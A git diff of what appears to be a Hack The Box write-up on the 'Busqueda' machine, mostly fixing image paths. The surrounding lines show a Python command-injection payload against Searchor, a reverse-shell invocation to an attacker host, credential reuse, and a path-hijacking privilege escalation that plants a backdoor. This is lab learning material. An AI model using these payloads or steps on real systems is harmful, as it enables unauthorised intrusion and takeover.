@@ -7,7 +7,7 @@ tags: [Easy, Linux, HTB]
 
 **Busqueda** is an easy HTB machine where we can achieve RCE by leveraging a **command injection CVE**. Following this, we gain root access by exploiting a **path hijacking vulnerability** uncovered through enumeration.
 
-<img src="/assets/images/busqueda/Untitled.png" alt="Untitled.png" style="width:600px;">
+<img src="/assets/img/busqueda/Untitled.png" alt="Untitled.png" style="width:600px;">
 
 # Reconnaissance
 
@@ -63,15 +63,15 @@ echo -e "10.129.16.142\tsearcher.htb" | sudo tee -a /etc/hosts
 
 The web page on port TCP/80 appears to offer a searching functionality with different engines.
 
-<img src="/assets/images/busqueda/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">
 
 There is a Searchor version at the bottom.
 
-<img src="/assets/images/busqueda/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">
 
 Further enumeration shows that this version is vulnerable to a **command injection vulnerability**.
 
-<img src="/assets/images/busqueda/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">
 
 Source: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.
 
@@ -83,7 +83,7 @@ After playing with Burp Suite for a while, we finally achieved **remote code exe
 myquery+'),__import__('os').system('whoami')#
 ```
 
-<img src="/assets/images/busqueda/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">
 
 For learning’s sake I created a Python PoC. I recommend you to create your own.
 
@@ -176,7 +176,7 @@ By specifying a target, we can execute commands in a non-interactive shell.
 python3 busqueda.py -t 10.129.16.142
 ```
 
-<img src="/assets/images/busqueda/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">
 
 We have the option to send us a reverse shell and transform it into a pseudo interactive TTY.
 
@@ -184,9 +184,9 @@ We have the option to send us a reverse shell and transform it into a pseudo int
 python3 busqueda.py -t 10.129.16.142 -r --lhost 10.10.14.112
 ```
 
-<img src="/assets/images/busqueda/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">
 
-<img src="/assets/images/busqueda/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">
 
 Before moving to PE, let’s read the user flag.
 
@@ -197,7 +197,7 @@ e2fb90c70cd7ec6e****************
 
 # PrivEsc
 
-The directory where we landed contains a **hidden .git directory**
+The directory where we landed contains a **hidden .git directory**.
 
 ```bash
 svc@busqueda:/var/www/app$ ls -lah
@@ -291,7 +291,7 @@ svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checku
 }
 ```
 
-To proceed, we will append the new vHost subdomain to /etc/hosts
+To proceed, we will append the new vHost subdomain to /etc/hosts.
 
 ```bash
 tail -n 1 /etc/hosts
@@ -300,27 +300,27 @@ tail -n 1 /etc/hosts
 
 And access the subdomain from our browser.
 
-<img src="/assets/images/busqueda/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">
 
 The credentials found in the .git config file were valid and we manged to gather another user called ‘administrator’ from our feed.
 
-<img src="/assets/images/busqueda/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">
 
-<img src="/assets/images/busqueda/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">
 
 There wasn’t much in Cody’s account. Surprisingly, the password from the docker container belongs to the administrator user. Now, we have much more fun stuff to enumerate.
 
-<img src="/assets/images/busqueda/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">
 
-<img src="/assets/images/busqueda/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">
 
 The scripts repository looks extremely familiar.
 
-<img src="/assets/images/busqueda/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">
 
 In fact, the system-checkup.py is the same script we were able to execute as root. If we look carefully, the 47th line has a **relative path**. We could try to exploit it.
 
-<img src="/assets/images/busqueda/Untitled 14.png" alt="Untitled 14.png" style="width:800px;">
+<img src="/assets/img/busqueda/Untitled 14.png" alt="Untitled 14.png" style="width:800px;">
 
 This bash script will create a **backdoor** for us.
 
